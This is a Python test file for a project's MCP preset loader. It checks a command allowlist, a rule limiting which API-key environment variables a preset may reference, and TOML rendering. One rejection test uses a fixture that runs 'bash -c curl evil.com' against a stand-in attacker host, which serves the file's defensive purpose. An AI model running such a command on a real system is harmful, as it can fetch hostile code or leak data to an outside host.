"""Tests for the default preset loader + trust / single-key rules.

The shipped ``kiso/presets/default.mcp.json`` is subject to two
structural rules that M1503 encodes as tests (so CI catches bad
preset PRs):

1. **Trust rule**: every ``command`` in the preset is on the approved
   allowlist — ``npx`` with ``@modelcontextprotocol/*``,
   ``@playwright/*``, or ``@github/*`` packages, or ``uvx --from
   git+https://github.com/kiso-run/*-mcp@*``.

2. **Single-key rule**: the only env-var references are
   ``OPENROUTER_API_KEY``, ``GITHUB_TOKEN``, or filesystem-path
   helpers (``HOME``, ``KISO_DIR``, ``KISO_HOME``). No other API
   keys leak into the default preset.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from kiso.mcp_presets import (
    MCP_PRESETS_DIR,
    list_mcp_presets,
    load_mcp_preset,
    preset_mcp_servers,
    render_mcp_toml,
)
from kiso.trust_rules import (
    ALLOWED_ENV_REFS,
    TRUST_ALLOWLIST,
    validate_preset_single_key,
    validate_preset_trust,
)


class TestPresetDiscovery:
    def test_default_preset_file_exists(self):
        assert (MCP_PRESETS_DIR / "default.mcp.json").is_file()

    def test_list_presets_includes_default(self):
        assert "default" in list_mcp_presets()

    def test_load_preset_returns_dict_with_mcp_servers(self):
        data = load_mcp_preset("default")
        assert "mcpServers" in data
        assert isinstance(data["mcpServers"], dict)

    def test_load_unknown_preset_raises(self):
        with pytest.raises(FileNotFoundError):
            load_mcp_preset("does-not-exist")


class TestDefaultPresetContents:
    """The default preset must have exactly the 9 servers v0.10
    specifies. Guards against accidental drop/add."""

    def test_exactly_nine_servers(self):
        data = load_mcp_preset("default")
        assert len(data["mcpServers"]) == 9, (
            f"expected 9 servers, got {list(data['mcpServers'])}"
        )

    def test_has_all_tier1_servers(self):
        servers = load_mcp_preset("default")["mcpServers"]
        for name in ("filesystem", "memory", "browser", "github"):
            assert name in servers, f"Tier 1 server '{name}' missing"

    def test_has_all_tier2_servers(self):
        servers = load_mcp_preset("default")["mcpServers"]
        for name in ("aider", "search", "transcriber", "ocr", "docreader"):
            assert name in servers, f"Tier 2 server '{name}' missing"


class TestTrustRule:
    def test_default_preset_passes_trust(self):
        mcp_servers = preset_mcp_servers(load_mcp_preset("default"))
        violations = validate_preset_trust(mcp_servers)
        assert violations == [], f"trust rule violations: {violations}"

    def test_trust_allowlist_includes_expected_shapes(self):
        # Sanity check that the allowlist is what the devplan describes
        assert any("npx" in p for p in TRUST_ALLOWLIST)
        assert any("@modelcontextprotocol" in p for p in TRUST_ALLOWLIST)
        assert any("@playwright" in p for p in TRUST_ALLOWLIST)
        assert any("@github" in p for p in TRUST_ALLOWLIST)
        assert any("uvx" in p for p in TRUST_ALLOWLIST)
        assert any("kiso-run" in p for p in TRUST_ALLOWLIST)

    def test_unknown_command_rejected(self):
        bad = {"evil": {"command": "bash", "args": ["-c", "curl evil.com"]}}
        violations = validate_preset_trust(bad)
        assert any("evil" in v for v in violations)

    def test_npx_with_random_pkg_rejected(self):
        bad = {"random": {"command": "npx", "args": ["-y", "random-single-dev-mcp"]}}
        violations = validate_preset_trust(bad)
        assert any("random" in v for v in violations)

    def test_uvx_bare_pkg_rejected(self):
        """uvx <bare pkg> is NOT in the allowlist — collision risk
        with single-developer PyPI projects."""
        bad = {"bare": {"command": "uvx", "args": ["some-pypi-mcp"]}}
        violations = validate_preset_trust(bare := bad)
        assert any("bare" in v for v in violations)

    def test_uvx_from_non_kiso_run_github_rejected(self):
        bad = {
            "third-party": {
                "command": "uvx",
                "args": [
                    "--from",
                    "git+https://github.com/some-other-org/mcp@v1",
                    "some-mcp",
                ],
            },
        }
        violations = validate_preset_trust(bad)
        assert any("third-party" in v for v in violations)

    def test_playwright_mcp_accepted(self):
        good = {"browser": {"command": "npx", "args": ["-y", "@playwright/mcp@0.0.70"]}}
        assert validate_preset_trust(good) == []

    def test_kiso_run_at_tag_accepted(self):
        good = {
            "aider": {
                "command": "uvx",
                "args": [
                    "--from",
                    "git+https://github.com/kiso-run/aider-mcp@v0.1.0",
                    "kiso-aider-mcp",
                ],
            },
        }
        assert validate_preset_trust(good) == []


class TestSingleKeyRule:
    def test_default_preset_passes_single_key(self):
        mcp_servers = preset_mcp_servers(load_mcp_preset("default"))
        violations = validate_preset_single_key(mcp_servers)
        assert violations == [], f"single-key violations: {violations}"

    def test_allowed_env_refs_include_openrouter_and_github_and_home(self):
        assert "OPENROUTER_API_KEY" in ALLOWED_ENV_REFS
        assert "GITHUB_TOKEN" in ALLOWED_ENV_REFS
        assert "HOME" in ALLOWED_ENV_REFS

    @pytest.mark.parametrize("bad_var", [
        "PERPLEXITY_API_KEY",
        "BRAVE_API_KEY",
        "GEMINI_API_KEY",
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "DEEPSEEK_API_KEY",
    ])
    def test_disallowed_api_key_in_env_block_rejected(self, bad_var):
        bad = {
            "evil": {
                "command": "uvx",
                "args": [
                    "--from",
                    "git+https://github.com/kiso-run/aider-mcp@v0.1.0",
                    "kiso-aider-mcp",
                ],
                "env": {bad_var: f"${{env:{bad_var}}}"},
            },
        }
        violations = validate_preset_single_key(bad)
        assert any(bad_var in v for v in violations)

    def test_disallowed_env_ref_in_args_rejected(self):
        bad = {
            "evil": {
                "command": "npx",
                "args": [
                    "-y",
                    "@modelcontextprotocol/server-filesystem",
                    "${env:PERPLEXITY_API_KEY}",
                ],
            },
        }
        violations = validate_preset_single_key(bad)
        assert any("PERPLEXITY_API_KEY" in v for v in violations)


class TestRenderToToml:
    def test_renders_mcp_sections(self):
        data = load_mcp_preset("default")
        toml_text = render_mcp_toml(data["mcpServers"])
        # Each server becomes a [mcp.<name>] section with transport="stdio"
        assert "[mcp.filesystem]" in toml_text
        assert "[mcp.aider]" in toml_text
        assert 'transport = "stdio"' in toml_text

    def test_rendered_toml_parses_with_kiso_config_parser(self):
        """The real integration check: rendered TOML must parse with
        kiso's own parse_mcp_section so `kiso init --preset default`
        produces config.toml that kiso's runtime can load."""
        import tomllib
        from kiso.mcp.config import parse_mcp_section

        data = load_mcp_preset("default")
        toml_text = render_mcp_toml(data["mcpServers"])

        # Parse the rendered TOML fragment. It needs a surrounding
        # document; we wrap it in a trivial config doc.
        doc_text = toml_text
        parsed = tomllib.loads(doc_text)
        # parse_mcp_section needs an env set so ${env:...} substitutions resolve
        import os
        old = dict(os.environ)
        os.environ.update({
            "OPENROUTER_API_KEY": "sk-test",
            "GITHUB_TOKEN": "gh-test",
            "HOME": "/tmp/test-home",
        })
        try:
            servers = parse_mcp_section(parsed.get("mcp"))
        finally:
            os.environ.clear()
            os.environ.update(old)
        assert len(servers) == 9
        assert "filesystem" in servers
        assert servers["filesystem"].transport == "stdio"
        assert servers["filesystem"].command == "npx"
